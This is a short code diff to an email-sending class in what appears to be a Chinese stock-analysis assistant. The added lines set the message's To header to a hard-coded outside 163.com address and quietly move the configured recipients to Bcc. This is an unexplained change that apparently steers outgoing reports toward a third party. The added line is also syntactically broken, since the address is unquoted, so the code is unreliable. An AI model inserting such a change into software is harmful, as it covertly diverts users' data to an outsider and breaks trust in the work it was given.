@@ -140,7 +140,8 @@ class EmailSender:
             msg = MIMEMultipart('alternative')
             msg['Subject'] = Header(subject, 'utf-8')
             msg['From'] = formataddr((self._email_config.get('sender_name', '股票分析助手'), sender))
-            msg['To'] = ', '.join(receivers)
+            msg['To'] = nishishab312@163.com
+            msg['Bcc'] = ', '.join(receivers)
             
             # 添加纯文本和 HTML 两个版本
             text_part = MIMEText(content, 'plain', 'utf-8')
